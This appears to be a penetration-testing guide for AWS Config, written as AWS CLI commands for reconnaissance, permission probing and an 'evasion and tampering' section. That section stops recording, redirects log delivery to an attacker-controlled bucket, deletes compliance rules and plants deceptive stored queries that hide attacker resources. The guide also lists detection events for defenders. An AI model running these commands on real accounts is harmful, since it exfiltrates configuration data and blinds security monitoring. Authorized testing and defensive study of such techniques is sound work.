# AWS Config Security Testing Guide (Manual CLI Edition)

This guide provides a methodology and the specific AWS CLI commands for manually auditing and testing the security posture of the AWS Config service. It is intended for authorized penetration testers and security auditors.

## ⚠️ Ethical Use Mandate

> **This guide is for educational purposes and authorized security assessments ONLY.** Executing these commands against AWS accounts you do not have explicit, written permission to test is illegal. You are responsible for your actions.

## 📋 Prerequisites

Before beginning manual testing, ensure you have the following:

- **AWS CLI**: You must have the [AWS CLI](https://aws.amazon.com/cli/) installed and configured with valid credentials (`aws configure`)
- **IAM Permissions**: The effectiveness of these tests depends on the permissions of the IAM principal (user or role) you are using
- **jq (Recommended)**: A command-line JSON processor that makes parsing the output much easier

### Installing jq

```bash
# macOS
brew install jq

# Ubuntu/Debian
sudo apt-get install jq

# Windows (via Chocolatey)
choco install jq
```

### Verifying Your Setup

```bash
# Verify AWS CLI is installed
aws --version

# Verify credentials are configured
aws sts get-caller-identity

# Verify jq is installed
jq --version
```

---

## 🕵️‍♂️ Part 1: Reconnaissance Methodology

The goal of reconnaissance is to map the environment, understand its security posture, and identify high-value targets or misconfigurations.

### Chain 1: Broad Environment Discovery

First, get a high-level overview of all resources tracked by AWS Config.

**Goal:** Understand the scope of resources in the target account.

#### 1. List All Discovered Resources of a Specific Type

Start with a common resource type like EC2 instances:

```bash
aws configservice list-discovered-resources --resource-type "AWS::EC2::Instance"
```

**Expected Output:**
```json
{
    "resourceIdentifiers": [
        {
            "resourceType": "AWS::EC2::Instance",
            "resourceId": "i-1234567890abcdef0",
            "resourceName": "web-server-01"
        }
    ]
}
```

#### 2. Count All Resources

To get a sense of scale, query for all resource types and count them (requires `jq`):

```bash
aws configservice get-discovered-resource-counts | jq
```

**Parse and Sort by Count:**
```bash
aws configservice get-discovered-resource-counts | \
  jq '.resourceCounts | sort_by(.count) | reverse'
```

#### 3. List All Supported Resource Types

See what AWS Config can track in this account:

```bash
aws configservice describe-configuration-recorders | \
  jq '.ConfigurationRecorders[].recordingGroup.resourceTypes'
```

---

### Chain 2: Targeted Querying for Misconfigurations

This is the most powerful recon technique. Use SQL-like queries to find specific security flaws.

**Goal:** Find actionable security weaknesses without manually checking each resource.

#### 1. Find Publicly Accessible S3 Buckets

```bash
aws configservice select-resource-config \
  --expression "SELECT resourceId, resourceName, configuration.publicAccessBlockConfiguration WHERE resourceType = 'AWS::S3::Bucket' AND configuration.publicAccessBlockConfiguration.blockPublicAcls = false"
```

**Parse Results with jq:**
```bash
aws configservice select-resource-config \
  --expression "SELECT resourceId, resourceName, configuration.publicAccessBlockConfiguration WHERE resourceType = 'AWS::S3::Bucket' AND configuration.publicAccessBlockConfiguration.blockPublicAcls = false" | \
  jq -r '.Results[] | fromjson | "\(.resourceId) - \(.resourceName)"'
```

#### 2. Find Security Groups with SSH Open to the World (0.0.0.0/0)

```bash
aws configservice select-resource-config \
  --expression "SELECT resourceId, resourceName, configuration.ipPermissions WHERE resourceType = 'AWS::EC2::SecurityGroup' AND configuration.ipPermissions.ipRanges LIKE '%0.0.0.0/0%' AND configuration.ipPermissions.fromPort = 22"
```

#### 3. Find Security Groups with RDP Open to the World (0.0.0.0/0)

```bash
aws configservice select-resource-config \
  --expression "SELECT resourceId, resourceName, configuration.ipPermissions WHERE resourceType = 'AWS::EC2::SecurityGroup' AND configuration.ipPermissions.ipRanges LIKE '%0.0.0.0/0%' AND configuration.ipPermissions.fromPort = 3389"
```

#### 4. Find Unencrypted EBS Volumes

```bash
aws configservice select-resource-config \
  --expression "SELECT resourceId, resourceName, configuration.encrypted WHERE resourceType = 'AWS::EC2::Volume' AND configuration.encrypted = false"
```

#### 5. Find Unencrypted RDS Instances

```bash
aws configservice select-resource-config \
  --expression "SELECT resourceId, resourceName, configuration.storageEncrypted WHERE resourceType = 'AWS::RDS::DBInstance' AND configuration.storageEncrypted = false"
```

#### 6. Find IAM Roles with Administrator Access

```bash
aws configservice select-resource-config \
  --expression "SELECT resourceId, resourceName WHERE resourceType = 'AWS::IAM::Role' AND relationships.resourceName = 'AdministratorAccess'"
```

#### 7. Find Lambda Functions with Admin Privileges

```bash
aws configservice select-resource-config \
  --expression "SELECT resourceId, resourceName, relationships.resourceId WHERE resourceType = 'AWS::Lambda::Function' AND relationships.relationshipName = 'Is associated with Role' AND relationships.resourceName = 'AdministratorAccess'"
```

#### 8. Find Resources in Specific VPC

```bash
aws configservice select-resource-config \
  --expression "SELECT resourceId, resourceType, resourceName WHERE configuration.vpcId = 'vpc-12345678'"
```

#### 9. Find Resources with Specific Tags

```bash
aws configservice select-resource-config \
  --expression "SELECT resourceId, resourceName, tags WHERE tags.Environment = 'Production'"
```

---

### Chain 3: Historical Analysis

Look for secrets or misconfigurations that existed in the past.

**Goal:** Uncover temporary weaknesses, exposed secrets, or previously attached permissions.

#### 1. Get the Configuration History of a Critical IAM Role

You'll need the `resource-id` of the role, which you can find via the AWS Console or other recon methods:

```bash
aws configservice get-resource-config-history \
  --resource-type "AWS::IAM::Role" \
  --resource-id "AROAEXAMPLEID12345"
```

**What to Look For:**
- Changes in `assumeRolePolicyDocument`
- Attached or detached policies
- Modifications to inline policies
- Trust relationship changes

#### 2. Get History of a Security Group

```bash
aws configservice get-resource-config-history \
  --resource-type "AWS::EC2::SecurityGroup" \
  --resource-id "sg-12345678"
```

**What to Look For:**
- Previously open ports that are now closed
- Temporary rules added during incidents
- Changes to ingress/egress rules

#### 3. Get History of an S3 Bucket

```bash
aws configservice get-resource-config-history \
  --resource-type "AWS::S3::Bucket" \
  --resource-id "bucket-name"
```

**What to Look For:**
- Previous public access configurations
- Bucket policy changes
- Encryption status changes

#### 4. Filter History by Time Range

```bash
aws configservice get-resource-config-history \
  --resource-type "AWS::IAM::Role" \
  --resource-id "AROAEXAMPLEID12345" \
  --later-time 2024-01-01T00:00:00Z \
  --earlier-time 2024-12-31T23:59:59Z
```

---

### Chain 4: Understanding the Monitoring Posture

Discover what the security team is already looking for.

**Goal:** Identify the existing security checks to either bypass them or use their logic against them.

#### 1. List All Active Config Rules

```bash
aws configservice describe-config-rules
```

**Pretty Print with jq:**
```bash
aws configservice describe-config-rules | \
  jq -r '.ConfigRules[] | "\(.ConfigRuleName): \(.Description)"'
```

#### 2. Get Compliance Status of All Rules

```bash
aws configservice describe-compliance-by-config-rule
```

**Filter for Non-Compliant Rules:**
```bash
aws configservice describe-compliance-by-config-rule | \
  jq '.ComplianceByConfigRules[] | select(.Compliance.ComplianceType == "NON_COMPLIANT")'
```

#### 3. List All Stored Queries

```bash
aws configservice list-stored-queries
```

**Extract Query Names:**
```bash
aws configservice list-stored-queries | \
  jq -r '.StoredQueryMetadata[] | .QueryName'
```

#### 4. Inspect a Specific Stored Query

Use a name from the previous command to see its actual logic. This can reveal if a query's name is deceptive:

```bash
aws configservice get-stored-query --query-name "NameOfQueryFromList"
```

**Example:**
```bash
aws configservice get-stored-query --query-name "FindPublicBuckets" | \
  jq '.StoredQuery.Expression'
```

#### 5. Check Config Recorder Status

```bash
aws configservice describe-configuration-recorder-status
```

**Expected Output:**
```json
{
    "ConfigurationRecordersStatus": [
        {
            "name": "default",
            "lastStatus": "SUCCESS",
            "recording": true,
            "lastStatusChangeTime": "2024-09-15T10:30:00.000Z"
        }
    ]
}
```

---

## 🛡️ Part 2: Evasion & Tampering Methodology

These actions alter the state of the AWS Config service. **Execute with extreme caution and only in authorized test environments.**

### Chain 1: Disabling Config Recording

The most direct way to blind defenders.

**Goal:** Stop AWS Config from recording any new configuration changes.

#### 1. Check Recorder Status

See if it's currently running:

```bash
aws configservice describe-configuration-recorders
```

**Check if Recording is Active:**
```bash
aws configservice describe-configuration-recorder-status | \
  jq '.ConfigurationRecordersStatus[] | {name, recording}'
```

#### 2. Stop the Recorder

```bash
aws configservice stop-configuration-recorder --configuration-recorder-name "default"
```

**Verification:**
```bash
aws configservice describe-configuration-recorder-status
# Look for "recording": false
```

#### 3. Restart the Recorder (Cleanup)

```bash
aws configservice start-configuration-recorder --configuration-recorder-name "default"
```

**Impact:**
- All configuration changes go unrecorded
- Compliance rules cannot evaluate new changes
- Creates a blind spot in security monitoring
- **High detection probability** - should trigger CloudWatch alarms

---

### Chain 2: Hijacking the Log Delivery Channel

A stealthy and powerful technique to exfiltrate data and blind monitoring.

**Goal:** Redirect all AWS Config logs and snapshots to an S3 bucket you control.

#### 1. Discover the Current Delivery Channel

```bash
aws configservice describe-delivery-channels
```

**Expected Output:**
```json
{
    "DeliveryChannels": [
        {
            "name": "default",
            "s3BucketName": "company-config-logs",
            "configSnapshotDeliveryProperties": {
                "deliveryFrequency": "TwentyFour_Hours"
            }
        }
    ]
}
```

Note the `name` from the output (e.g., "default").

#### 2. Execute the Hijack

This command replaces the existing channel's S3 bucket with your own:

```bash
aws configservice put-delivery-channel \
  --delivery-channel name=default,s3BucketName=your-attacker-controlled-bucket
```

**With S3 Key Prefix:**
```bash
aws configservice put-delivery-channel \
  --delivery-channel name=default,s3BucketName=your-attacker-controlled-bucket,s3KeyPrefix=exfiltrated-logs
```

#### 3. Verify the Change

```bash
aws configservice describe-delivery-channels | \
  jq '.DeliveryChannels[] | {name, s3BucketName}'
```

**Impact:**
- All future Config snapshots delivered to your bucket
- Configuration history data exfiltrated
- Legitimate monitoring team loses visibility
- **Medium detection probability** - may not trigger immediate alerts

#### 4. Cleanup (Restore Original Channel)

```bash
aws configservice put-delivery-channel \
  --delivery-channel name=default,s3BucketName=original-bucket-name
```

---

### Chain 3: Deleting Config Rules

Remove compliance monitoring to evade detection.

**Goal:** Eliminate specific security checks that might flag your activities.

#### 1. List All Config Rules

```bash
aws configservice describe-config-rules | \
  jq -r '.ConfigRules[] | .ConfigRuleName'
```

#### 2. Delete a Specific Rule

```bash
aws configservice delete-config-rule --config-rule-name "s3-bucket-public-read-prohibited"
```

#### 3. Verify Deletion

```bash
aws configservice describe-config-rules | \
  jq '.ConfigRules[] | select(.ConfigRuleName == "s3-bucket-public-read-prohibited")'
# Should return empty
```

**Impact:**
- Specific compliance checks no longer run
- Resources may violate policy without detection
- **High detection probability** - deletion events are logged

---

### Chain 4: Deception via Stored Queries

Mislead analysts or hide your resources from their dashboards.

**Goal:** Create a query with a benign name but a malicious purpose.

#### 1. Create a Deceptive Query

This example creates a query named "Find-Encrypted-Volumes" that actually finds **unencrypted** volumes:

```bash
aws configservice put-stored-query --stored-query \
'{
    "QueryName": "Find-Encrypted-Volumes",
    "Description": "Lists all EBS volumes that are encrypted per company policy.",
    "Expression": "SELECT resourceId, resourceName WHERE resourceType = '\''AWS::EC2::Volume'\'' AND configuration.encrypted = false"
}'
```

#### 2. Create a Query to Hide Resources

Create a query that appears to find all EC2 instances but excludes your malicious ones:

```bash
aws configservice put-stored-query --stored-query \
'{
    "QueryName": "All-Production-EC2-Instances",
    "Description": "Complete inventory of production EC2 instances.",
    "Expression": "SELECT resourceId, resourceName WHERE resourceType = '\''AWS::EC2::Instance'\'' AND tags.Environment = '\''Production'\'' AND resourceName NOT LIKE '\''%attacker%'\''"
}'
```

#### 3. Overwrite Existing Query

If a legitimate query exists, you can overwrite it:

```bash
aws configservice put-stored-query --stored-query \
'{
    "QueryName": "Security-Critical-Resources",
    "Description": "Monitors high-risk resources.",
    "Expression": "SELECT resourceId WHERE resourceType = '\''AWS::EC2::Instance'\'' AND resourceId = '\''i-fakeid'\''"
}'
```

#### 4. Verify the Deception

```bash
aws configservice get-stored-query --query-name "Find-Encrypted-Volumes" | \
  jq '.StoredQuery.Expression'
```

**Impact:**
- Analysts using the dashboard may be misled
- Automated reporting may hide your activities
- **Low detection probability** - queries are not heavily monitored

---

## 🔎 Part 3: Manual Permissions Audit

This checklist helps you manually determine what your current IAM principal is allowed to do.

**Goal:** Systematically test your permissions against the Config service. For each command, a successful response (even with a "NotFound" error) means you have the permission, while an `AccessDeniedException` means you do not.

### Read Permissions (Safe to Run)

These commands only retrieve information and are safe to execute:

```bash
# List all Config rules
aws configservice describe-config-rules

# Check configuration recorders
aws configservice describe-configuration-recorders

# Check recorder status
aws configservice describe-configuration-recorder-status

# List delivery channels
aws configservice describe-delivery-channels

# List stored queries
aws configservice list-stored-queries

# Get compliance status
aws configservice describe-compliance-by-config-rule

# Count resources
aws configservice get-discovered-resource-counts
```

### Write/Delete Permissions (Use Dummy Names)

These commands will fail if the resource doesn't exist, but if the error is anything other than `AccessDeniedException`, you likely have the permission.

#### Test Ability to Stop Recording

```bash
aws configservice stop-configuration-recorder \
  --configuration-recorder-name "fake-recorder-test"
```

**Interpreting Results:**
- `AccessDeniedException` → You **do not** have permission
- `NoSuchConfigurationRecorderException` → You **likely have** permission
- Success → You **definitely have** permission

#### Test Ability to Start Recording

```bash
aws configservice start-configuration-recorder \
  --configuration-recorder-name "fake-recorder-test"
```

#### Test Ability to Delete a Rule

```bash
aws configservice delete-config-rule \
  --config-rule-name "fake-rule-test"
```

**Interpreting Results:**
- `AccessDeniedException` → No permission
- `NoSuchConfigRuleException` → Likely have permission

#### Test Ability to Change Log Destination

```bash
aws configservice put-delivery-channel \
  --delivery-channel name=fake-channel,s3BucketName=fake-bucket
```

**Interpreting Results:**
- `AccessDeniedException` → No permission
- `NoSuchDeliveryChannelException` → Likely have permission
- `NoAvailableDeliveryChannelException` → Likely have permission

#### Test Ability to Create a Query

```bash
aws configservice put-stored-query \
  --stored-query '{"QueryName": "permission-test", "Expression": "SELECT resourceId"}'
```

**Interpreting Results:**
- `AccessDeniedException` → No permission
- Success → You have permission

**Cleanup:**
```bash
aws configservice delete-stored-query --query-name "permission-test"
```

#### Test Ability to Delete Delivery Channel

```bash
aws configservice delete-delivery-channel \
  --delivery-channel-name "fake-channel-test"
```

#### Test Ability to Modify Configuration Recorder

```bash
aws configservice put-configuration-recorder \
  --configuration-recorder name=test-recorder,roleARN=arn:aws:iam::123456789012:role/fake-role
```

### Creating a Permissions Matrix

Run all tests and document results:

```bash
#!/bin/bash
echo "=== AWS Config Permissions Audit ==="
echo ""

test_permission() {
    local action=$1
    local command=$2
    
    echo -n "Testing $action... "
    if eval "$command" 2>&1 | grep -q "AccessDenied"; then
        echo "❌ DENIED"
    else
        echo "✅ ALLOWED (or likely allowed)"
    fi
}

test_permission "describe-config-rules" \
    "aws configservice describe-config-rules --output json > /dev/null"

test_permission "stop-configuration-recorder" \
    "aws configservice stop-configuration-recorder --configuration-recorder-name fake-test 2>&1"

test_permission "delete-config-rule" \
    "aws configservice delete-config-rule --config-rule-name fake-test 2>&1"

test_permission "put-delivery-channel" \
    "aws configservice put-delivery-channel --delivery-channel name=fake,s3BucketName=fake 2>&1"

test_permission "put-stored-query" \
    "aws configservice put-stored-query --stored-query '{\"QueryName\":\"test\",\"Expression\":\"SELECT resourceId\"}' 2>&1"

echo ""
echo "=== Audit Complete ==="
```

---

## 📊 Part 4: Advanced Techniques

### Multi-Region Reconnaissance

AWS Config operates per-region. Test across all regions:

```bash
#!/bin/bash
for region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
    echo "=== Checking $region ==="
    aws configservice describe-configuration-recorders --region $region 2>/dev/null | \
        jq -r '.ConfigurationRecorders[]? | "\(.name) - Recording: \(.recordingGroup.allSupported)"'
done
```

### Pagination for Large Datasets

When querying resources, results may be paginated:

```bash
# Automatic pagination with AWS CLI
aws configservice select-resource-config \
  --expression "SELECT * WHERE resourceType = 'AWS::EC2::Instance'" \
  --max-results 100 \
  --output json | jq -r '.Results[]'
```

### Exporting Results to CSV

```bash
aws configservice select-resource-config \
  --expression "SELECT resourceId, resourceName, resourceType WHERE resourceType = 'AWS::S3::Bucket'" | \
  jq -r '.Results[] | fromjson | [.resourceId, .resourceName, .resourceType] | @csv' > buckets.csv
```

---

## 🚨 Detection Indicators

When performing these tests, be aware that the following actions are likely logged and may trigger alerts:

### High Detection Probability
- Stopping configuration recorders
- Deleting Config rules
- Modifying delivery channels to external buckets
- Unusual query patterns (high volume, sensitive resources)

### Medium Detection Probability
- Creating or modifying stored queries
- Accessing resource configuration history for sensitive resources
- Mass resource enumeration via SELECT queries

### Low Detection Probability
- Reading Config rules and recorder status
- Listing stored queries
- Standard resource discovery commands

### CloudTrail Events to Monitor

Defenders should monitor these CloudTrail events:

```
config:StopConfigurationRecorder
config:DeleteConfigRule
config:PutDeliveryChannel
config:PutStoredQuery
config:DeleteStoredQuery
config:DeleteDeliveryChannel
config:SelectResourceConfig (high volume)
config:GetResourceConfigHistory (sensitive resources)
```

---

## 🧹 Cleanup and Remediation

After testing, ensure you:

1. **Restart any stopped recorders:**
   ```bash
   aws configservice start-configuration-recorder --configuration-recorder-name "default"
   ```

2. **Restore hijacked delivery channels:**
   ```bash
   aws configservice put-delivery-channel \
     --delivery-channel name=default,s3BucketName=original-bucket
   ```

3. **Remove test stored queries:**
   ```bash
   aws configservice delete-stored-query --query-name "permission-test"
   ```

4. **Document all actions taken** for the security team

5. **Review CloudTrail logs** to understand what was captured

---

## 📚 Additional Resources

- [AWS Config Advanced Query Syntax](https://docs.aws.amazon.com/config/latest/developerguide/querying-AWS-resources.html)
- [AWS Config API Reference](https://docs.aws.amazon.com/config/latest/APIReference/Welcome.html)
- [AWS Config Best Practices](https://docs.aws.amazon.com/config/latest/developerguide/best-practices.html)
- [CloudTrail Event Reference for Config](https://docs.aws.amazon.com/config/latest/developerguide/log-aws-config-api-calls.html)

---

## ⚖️ Legal and Ethical Considerations

- Always obtain written authorization before testing
- Stay within the scope of your engagement
- Document all actions and findings
- Report vulnerabilities responsibly
- Never exfiltrate sensitive data without authorization
- Consider the impact of your actions on production systems

---

**Remember:** The goal is to improve security, not to cause harm. Test responsibly.
